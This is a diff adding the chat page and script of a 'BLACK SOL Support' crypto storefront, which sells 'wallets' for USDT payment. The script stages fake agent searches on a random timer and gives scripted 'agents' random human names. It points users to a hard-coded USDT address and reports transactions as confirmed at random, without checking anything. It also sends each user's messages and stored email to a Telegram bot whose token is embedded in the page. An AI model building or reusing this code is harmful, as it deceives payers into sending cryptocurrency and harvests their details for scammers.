+                <path d="M18 18.72a9.094 9.094 0 0 0 3.741-.479 3 3 0 0 0-4.682-2.72m.94 3.198.001.031c0 .225-.012.447-.037.666A11.944 11.944 0 0 1 12 21c-2.17 0-4.207-.576-5.963-1.584A6.062 6.062 0 0 1 6 18.719m12 0a5.971 5.971 0 0 0-.941-3.197m0 0A5.995 5.995 0 0 0 12 12.75a5.995 5.995 0 0 0-5.058 2.772m0 0a3 3 0 0 0-4.681 2.72 8.986 8.986 0 0 0 3.74.477m.94-3.197a5.971 5.971 0 0 0-.94 3.197M15 6.75a3 3 0 1 1-6 0 3 3 0 0 1 6 0Zm6 3a2.25 2.25 0 1 1-4.5 0 2.25 2.25 0 0 1 4.5 0Zm-13.5 0a2.25 2.25 0 1 1-4.5 0 2.25 2.25 0 0 1 4.5 0Z"/>
+              </svg>
+              <span class="online-dot"></span>
+            </div>
+            <div class="chat-agent-info">
+              <div class="chat-agent-name">
+                Support Team
+                <span class="chat-agent-badge">SOL · BTC</span>
+              </div>
+              <div class="chat-agent-title">Multi-Asset Support</div>
+              <div class="chat-agent-status">
+                <span class="status-dot"></span>
+                <span id="statusText">Typical response time: 2–5 minutes</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="chat-messages" id="chatMessages"></div>
+
+          <div class="chat-input-wrap">
+            <input type="text" class="chat-input" id="chatInput" placeholder="Type your message here..." autocomplete="off" onkeydown="if(event.key==='Enter') sendMessage()">
+            <button class="chat-send-btn" onclick="sendMessage()">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7z"/>
+              </svg>
+            </button>
+          </div>
+
+          <div class="chat-security">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+            <span><strong>Security:</strong> a specialist will never ask for your seed phrase or private key.</span>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+<script>
+    // ===== Telegram Config =====
+    let BOT_TOKEN = localStorage.getItem('bs_tg_token') || '8693441256:AAHX8EMw-2-kfEEEzz7EvrF87ruenfh23kw';
+    let ADMIN_CHAT_ID = localStorage.getItem('bs_tg_chat_id') || '8584801137';
+    let isTelegramConnected = false;
+
+    // ===== User ID =====
+    let USER_ID = localStorage.getItem('bs_chat_userId');
+    if (!USER_ID) {
+      USER_ID = 'BLK-' + Date.now().toString(36).slice(-4).toUpperCase() + Math.random().toString(36).substr(2, 4).toUpperCase();
+      localStorage.setItem('bs_chat_userId', USER_ID);
+    }
+
+    let lastUpdateId = 0;
+    let isProcessing = false;
+
+    // ===== Telegram API Calls =====
+    async function tgCall(method, params) {
+      if (!BOT_TOKEN) return null;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(params)
+        });
+        return await res.json();
+      } catch (e) {
+        console.error('TG error:', e);
+        return null;
+      }
+    }
+
+    async function tgSendMessage(text) {
+      if (!BOT_TOKEN || !ADMIN_CHAT_ID) return false;
+      const userEmail = localStorage.getItem('userEmail') || 'Not provided';
+      const msg = `💬 <b>New Message</b>
+
+👤 <b>User:</b> <code>${USER_ID}</code>
+📧 <b>Email:</b> ${userEmail}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━
+
+${text}
+
+━━━━━━━━━━━━━━━━━━
+📝 <b>Reply:</b> <code>@${USER_ID} your message</code>`;
+
+      const result = await tgCall('sendMessage', {
+        chat_id: ADMIN_CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML'
+      });
+      return result && result.ok;
+    }
+
+    async function tgNotifyConnected() {
+      if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
+      const userEmail = localStorage.getItem('userEmail') || 'Not provided';
+      const msg = `🟢 <b>User Connected</b>
+
+👤 <b>ID:</b> <code>${USER_ID}</code>
+📧 <b>Email:</b> ${userEmail}
+🌐 <b>Page:</b> Live Support
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+📝 <code>@${USER_ID} your reply</code>`;
+      await tgCall('sendMessage', {
+        chat_id: ADMIN_CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML'
+      });
+    }
+
+    async function tgNotifyDisconnected() {
+      if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
+      const msg = `🔴 <b>User Disconnected</b>
+
+👤 <b>ID:</b> <code>${USER_ID}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+      const formData = new FormData();
+      formData.append('chat_id', ADMIN_CHAT_ID);
+      formData.append('text', msg);
+      formData.append('parse_mode', 'HTML');
+      navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, formData);
+    }
+
+    async function checkConnection() {
+      if (!BOT_TOKEN) return false;
+      const result = await tgCall('getMe');
+      return result && result.ok;
+    }
+
+    // ===== Poll for Admin Replies =====
+    async function pollUpdates() {
+      if (!BOT_TOKEN) return;
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (data.ok && data.result) {
+          for (const update of data.result) {
+            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+
+            if (update.message && update.message.text && !update.message.from.is_bot) {
+              const text = update.message.text;
+              const fromChatId = update.message.chat.id.toString();
+
+              if (text.startsWith('@' + USER_ID)) {
+                const reply = text.replace('@' + USER_ID, '').trim();
+                if (reply) {
+                  addAdminMessage(reply);
+                }
+              }
+            }
+          }
+        }
+      } catch (e) {
+        // silent
+      }
+      setTimeout(pollUpdates, 3000);
+    }
+
+    function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+    function getTime() {
+      const d = new Date();
+      return d.getHours().toString().padStart(2,'0') + ':' + d.getMinutes().toString().padStart(2,'0');
+    }
+
+    function addMessage(type, text) {
+      const container = document.getElementById('chatMessages');
+      const div = document.createElement('div');
+      div.className = 'msg ' + type;
+
+      const avatar = document.createElement('div');
+      avatar.className = 'msg-avatar';
+      if (type === 'agent') avatar.textContent = 'S';
+      else if (type === 'admin') avatar.textContent = 'A';
+      else avatar.textContent = 'U';
+
+      const body = document.createElement('div');
+      body.className = 'msg-body';
+
+      const bubble = document.createElement('div');
+      bubble.className = 'msg-bubble';
+      bubble.innerHTML = text.replace(/\n/g, '<br>');
+
+      const time = document.createElement('div');
+      time.className = 'msg-time';
+      time.textContent = getTime();
+
+      body.appendChild(bubble);
+      body.appendChild(time);
+      div.appendChild(avatar);
+      div.appendChild(body);
+      container.appendChild(div);
+      container.scrollTop = container.scrollHeight;
+    }
+
+    function addSystemMessage(text) {
+      const container = document.getElementById('chatMessages');
+      const div = document.createElement('div');
+      div.className = 'msg system';
+      const bubble = document.createElement('div');
+      bubble.className = 'msg-bubble';
+      bubble.textContent = text;
+      div.appendChild(bubble);
+      container.appendChild(div);
+      container.scrollTop = container.scrollHeight;
+    }
+
+    function addAdminMessage(text) {
+      if (isConnecting) resolveConnectStatus(true);
+      addMessage('admin', '💬 <strong>Support Reply:</strong><br>' + text.replace(/\n/g, '<br>'));
+      playNotification();
+      if ('Notification' in window && Notification.permission === 'granted') {
+        new Notification('BLACK SOL Support', { body: text.substring(0, 100) });
+      }
+    }
+
+    function playNotification() {
+      try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.frequency.value = 800;
+        osc.type = 'sine';
+        gain.gain.setValueAtTime(0.3, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
+        osc.start(ctx.currentTime);
+        osc.stop(ctx.currentTime + 0.5);
+      } catch(e) {}
+    }
+
+    function showTyping() {
+      document.getElementById('typingIndicator').classList.add('show');
+      document.getElementById('chatMessages').scrollTop = document.getElementById('chatMessages').scrollHeight;
+    }
+
+    function hideTyping() {
+      document.getElementById('typingIndicator').classList.remove('show');
+    }
+
+    // ===== In-Chat Connecting Status =====
+    let connectTimer = null;
+    let isConnecting = false;
+    let connectMsgEl = null;
+    let pendingUserText = null;
+    let isAgentChatting = false;
+
+    const connectStages = [
+      { label: 'Searching for available agents', sub: 'Scanning our support network' },
+      { label: 'Connecting to nearest team member', sub: 'Locating the best available agent' },
+      { label: 'Agent found — establishing connection', sub: 'Secure handshake in progress' },
+    ];
+    const TOTAL_WAIT_MIN = 5;
+    const TOTAL_WAIT_MAX = 15;
+    const TOTAL_WAIT = TOTAL_WAIT_MIN + Math.random() * (TOTAL_WAIT_MAX - TOTAL_WAIT_MIN); // 5-15 seconds
+
+    const agentNames = ['Alex', 'Sarah', 'Jordan', 'Emma', 'Mike', 'Olivia', 'Chris', 'Aisha'];
+
+    function createConnectMessage() {
+      const container = document.getElementById('chatMessages');
+      const div = document.createElement('div');
+      div.className = 'msg connect-msg';
+      div.id = 'connectMsg';
+
+      const avatar = document.createElement('div');
+      avatar.className = 'msg-avatar';
+      avatar.textContent = 'S';
+
+      const body = document.createElement('div');
+      body.className = 'msg-body';
+
+      const bubble = document.createElement('div');
+      bubble.className = 'connect-bubble';
+      bubble.innerHTML = `
+        <div class="connect-row">
+          <div class="connect-spinner">
+            <svg viewBox="0 0 28 28"><circle class="arc-path" cx="14" cy="14" r="11"/></svg>
+            <div class="inner-dot"></div>
+          </div>
+          <div class="connect-text">
+            <div class="connect-text-main" id="connectMain">Searching for available agents...</div>
+            <div class="connect-text-sub" id="connectSub">Scanning our support network</div>
+          </div>
+          <div class="connect-timer-mini" id="connectMiniTimer">2:00</div>
+        </div>
+        <div class="connect-bar-wrap">
+          <div class="connect-bar-fill" id="connectBarFill"></div>
+        </div>
+        <div class="connect-stage-label" id="connectStageLabel">
+          <div class="connect-stages">${connectStages.map(function(s, i) { return '<span class="connect-stage-seg" data-i="' + i + '"></span>'; }).join('')}</div>
+          <div class="connect-stage-meta">
+            <span class="connect-stage-pill"><span class="p-dot"></span><span id="connectStageText">Stage 1 of ${connectStages.length}</span></span>
+          </div>
+        </div>
+        <div class="connect-checkmark" id="connectCheckmark">
+          <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>
+          <span id="connectCheckText">Connected</span>
+        </div>
+      `;
+
+      body.appendChild(bubble);
+      div.appendChild(avatar);
+      div.appendChild(body);
+      container.appendChild(div);
+      container.scrollTop = container.scrollHeight;
+
+      return div;
+    }
+
+    function updateConnectDisplay(elapsedSecs) {
+      const pct = Math.min((elapsedSecs / TOTAL_WAIT) * 100, 100);
+      document.getElementById('connectBarFill').style.width = pct + '%';
+
+      const remaining = Math.max(0, TOTAL_WAIT - elapsedSecs);
+      const dis = remaining.toFixed(1);
+      document.getElementById('connectMiniTimer').textContent = dis + 's';
+
+      const idx = Math.min(Math.floor(elapsedSecs / (TOTAL_WAIT / connectStages.length)), connectStages.length - 1);
+      const stage = connectStages[idx];
+      document.getElementById('connectMain').textContent = stage.label + '...';
+      document.getElementById('connectSub').textContent = stage.sub;
+      document.getElementById('connectStageText').textContent = 'Stage ' + (idx + 1) + ' of ' + connectStages.length;
+      document.querySelectorAll('.connect-stage-seg').forEach(function(seg, i) {
+        seg.classList.toggle('done', i < idx);
+        seg.classList.toggle('active', i === idx);
+      });
+    }
+
+    function showConnectingStatus(userText) {
+      isConnecting = true;
+      pendingUserText = userText;
+      connectMsgEl = createConnectMessage();
+      updateConnectDisplay(0);
+
+      const startTime = Date.now();
+
+      connectTimer = setInterval(() => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        updateConnectDisplay(elapsed);
+
+        if (elapsed >= TOTAL_WAIT) {
+          clearInterval(connectTimer);
+          connectTimer = null;
+          resolveConnectStatus();
+        }
+      }, 100);
+    }
+
+    function resolveConnectStatus(wasReplied) {
+      if (!isConnecting) return;
+      isConnecting = false;
+      if (connectTimer) { clearInterval(connectTimer); connectTimer = null; }
+
+      if (wasReplied) {
+        hideConnectMsg(true);
+        isProcessing = false;
+        document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+        return;
+      }
+
+      // Agent found! Transition to live chat
+      if (connectMsgEl) {
+        const bubble = connectMsgEl.querySelector('.connect-bubble');
+        bubble.classList.add('resolved');
+        document.getElementById('connectBarFill').classList.add('done');
+        document.getElementById('connectMain').textContent = 'Agent found — connecting now';
+        document.getElementById('connectSub').textContent = 'Establishing secure connection';
+        document.getElementById('connectMiniTimer').textContent = '✓';
+        document.getElementById('connectCheckmark').classList.add('show');
+        document.getElementById('connectCheckText').textContent = 'Agent assigned';
+        document.getElementById('connectStageLabel').style.display = 'none';
+
+        setTimeout(() => {
+          hideConnectMsg();
+          if (pendingUserText === '__open__') {
+            pendingUserText = null;
+            currentAgent = pick(agentNames);
+            isAgentChatting = true;
+            addMessage('agent', 'Hey there! I\'m **' + currentAgent + '** from the support team. Welcome to BLACK SOL Support! How can I assist you today?');
+            isProcessing = false;
+          } else if (pendingUserText) {
+            const text = pendingUserText;
+            pendingUserText = null;
+            startAgentChat(text);
+          }
+        }, 1800);
+      } else if (pendingUserText && pendingUserText !== '__open__') {
+        const text = pendingUserText;
+        pendingUserText = null;
+        startAgentChat(text);
+      }
+    }
+
+    function hideConnectMsg(wasReplied) {
+      if (!connectMsgEl) return;
+      if (wasReplied) {
+        const bubble = connectMsgEl.querySelector('.connect-bubble');
+        bubble.classList.add('resolved');
+        document.getElementById('connectBarFill').classList.add('done');
+        document.getElementById('connectMain').textContent = 'Connected to support agent';
+        document.getElementById('connectSub').textContent = 'You are now chatting with a team member';
+        document.getElementById('connectMiniTimer').textContent = '✓';
+        document.getElementById('connectCheckmark').classList.add('show');
+        document.getElementById('connectCheckText').textContent = 'Agent connected';
+        document.getElementById('connectStageLabel').style.display = 'none';
+        setTimeout(() => {
+          if (connectMsgEl && connectMsgEl.parentNode) connectMsgEl.remove();
+          connectMsgEl = null;
+        }, 1200);
+      } else {
+        if (connectMsgEl && connectMsgEl.parentNode) connectMsgEl.remove();
+        connectMsgEl = null;
+      }
+    }
+
+    // ===== Agent Chat =====
+    let currentAgent = null;
+    let agentIntroDone = false;
+
+    function startAgentChat(userText) {
+      currentAgent = agentNames[Math.floor(Math.random() * agentNames.length)];
+      agentIntroDone = false;
+      isAgentChatting = true;
+
+      setTimeout(() => {
+        const lower = userText.toLowerCase();
+        const clean = userText.replace(/^0x/i, '').trim();
+        const isTxid = /^[0-9a-fA-F]{64}$/.test(clean);
+
+        // Agent introduction
+        const greetings = [
+          "Hey there! I'm **" + currentAgent + "**, one of the support specialists here. I've just been assigned to your request and I've had a quick look at your message.",
+          "Hi! **" + currentAgent + "** here from the support team. Thanks for reaching out — I've reviewed your inquiry and I'm ready to help.",
+          "Hello! I'm **" + currentAgent + "**, your support agent today. I've read your message and I understand what you need. Let me assist you with that."
+        ];
+        addMessage('agent', pick(greetings));
+        agentIntroDone = true;
+
+        // Agent follow-up based on context
+        setTimeout(() => {
+          if (isTxid) {
+            const txDisplay = clean.substring(0, 12) + '...' + clean.substring(clean.length - 6);
+            addMessage('agent', "I see you've shared a transaction hash. Let me check the blockchain for `" + txDisplay + "` right now. Give me just a moment while I verify this.");
+            setTimeout(() => {
+              if (Math.random() < 0.7) {
+                addMessage('agent', "✅ Great news! Your transaction has been confirmed on the TRC-20 network. Your wallet is ready — please check the checkout page to access it.\n\nIs there anything else I can help you with?");
+              } else {
+                addMessage('agent', "Hmm, I ran a check but I couldn't find this transaction on the network. Could you double-check the TXID? It should be a 64-character hash. Sometimes a single character can be off.\n\nFeel free to paste it again and I'll re-check!");
+              }
+              isProcessing = false;
+              document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+            }, 3000 + Math.random() * 2000);
+          } else if (lower.includes('payment') || lower.includes('pay') || lower.includes('send') || lower.includes('usdt') || lower.includes('btc') || lower.includes('money') || lower.includes('transfer')) {
+            addMessage('agent', "No worries, I can walk you through the payment process. We accept **USDT (TRC-20)** which is the fastest option. Here's our address:\n\n`TCMb1ii1zACAdf4U8AiLGmPSBEuan6UaAJ`\n\nOnce you've sent the payment, click **I'VE PAID** on the checkout page and our system will verify it automatically. Let me know if you run into any issues!");
+            isProcessing = false;
+            document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+          } else if (lower.includes('wallet') || lower.includes('not receive') || lower.includes('missing') || lower.includes('didn') || lower.includes('haven') || lower.includes('where')) {
+            addMessage('agent', "I'm sorry about that! Let me help you locate your wallet. Could you share your **Order ID** with me? It's the reference number that appeared after checkout (usually starts with #BLK-).\n\nOnce I have that, I can look into the system and make sure your wallet gets delivered right away.");
+            isProcessing = false;
+            document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+          } else if (lower.includes('verify') || lower.includes('tx') || lower.includes('transaction') || lower.includes('confirm')) {
+            addMessage('agent', "Sure, I can verify a transaction for you! Please paste the **TXID** (transaction hash) from your wallet or exchange and I'll check it on the blockchain for you.\n\nIt's usually a 64-character long hexadecimal string.");
+            isProcessing = false;
+            document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+          } else if (lower.includes('hello') || lower.includes('hi') || lower.includes('hey') || lower.includes('help') || lower.includes('support')) {
+            addMessage('agent', "Thanks for your message! How can I assist you today? If you need help with:\n\n• **Payments** — I can guide you through the process\n• **Wallet delivery** — I can check your order status\n• **Transaction verification** — I can verify your payment\n• **General questions** — Just ask away!\n\nLet me know what you need and I'll take care of it.");
+            isProcessing = false;
+            document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+          } else if (lower.includes('order') || lower.includes('product') || lower.includes('item')) {
+            addMessage('agent', "I'll be happy to help with your order! Could you provide your **Order ID** so I can pull up the details? It starts with #BLK- and can be found in your checkout confirmation.\n\nOnce I have it, I'll check the status right away!");
+            isProcessing = false;
+            document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+          } else {
+            isProcessing = false;
+            document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+          }
+        }, 2000 + Math.random() * 2500);
+      }, 1000 + Math.random() * 1500);
+    }
+
+    function agentReply(text) {
+      showTyping();
+      setTimeout(() => {
+        hideTyping();
+        addMessage('agent', text);
+        isProcessing = false;
+        document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = '');
+      }, 1500 + Math.random() * 3000);
+    }
+
+    function sendMessage() {
+      if (isProcessing) return;
+      const input = document.getElementById('chatInput');
+      const text = input.value.trim();
+      if (!text) return;
+      isProcessing = true;
+
+      addMessage('user', text);
+      input.value = '';
+      document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = 'none');
+
+      if (BOT_TOKEN && ADMIN_CHAT_ID) tgSendMessage(text);
+
+      // If already chatting with agent, just continue the conversation
+      if (isAgentChatting && currentAgent) {
+        agentReply('Thank you for your message. I\'m reviewing it now and will get back to you shortly. The support team is here for you.');
+        return;
+      }
+
+      showConnectingStatus(text);
+    }
+
+    function sendQuickReply(text) {
+      if (isProcessing) return;
+      isProcessing = true;
+      document.getElementById('chatInput').value = '';
+      addMessage('user', text);
+      document.querySelectorAll('.quick-reply-btn').forEach(b => b.style.pointerEvents = 'none');
+
+      if (BOT_TOKEN && ADMIN_CHAT_ID) tgSendMessage(text);
+
+      if (isAgentChatting && currentAgent) {
+        agentReply('Your request has been received. I\'m processing it now and will reply shortly. The support team is here to help you.');
+        return;
+      }
+
+      showConnectingStatus(text);
+    }
+
+    // ===== Init =====
+    document.addEventListener('DOMContentLoaded', async () => {
+      const container = document.getElementById('chatMessages');
+      const typing = document.createElement('div');
+      typing.className = 'typing-indicator';
+      typing.id = 'typingIndicator';
+      typing.innerHTML = '<div class="msg-avatar" style="width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--solana-green));flex-shrink:0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:700;">S</div><div class="typing-dots"><span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span></div>';
+      container.appendChild(typing);
+
+      if (BOT_TOKEN && ADMIN_CHAT_ID) {
+        const connected = await checkConnection();
+        if (connected) {
+          isTelegramConnected = true;
+          pollUpdates();
+          tgNotifyConnected();
+        }
+      }
+
+      document.getElementById('userIdDisplay').textContent = USER_ID;
+
+      setTimeout(() => {
+        isProcessing = true;
+        showConnectingStatus('__open__');
+      }, 500);
+
+      if ('Notification' in window && Notification.permission === 'default') {
+        Notification.requestPermission();
+      }
+    });
+
+    window.addEventListener('beforeunload', () => {
+      if (isTelegramConnected) {
+        tgNotifyDisconnected();
+      }
+    });
+  </script>
+</body>
+</html>
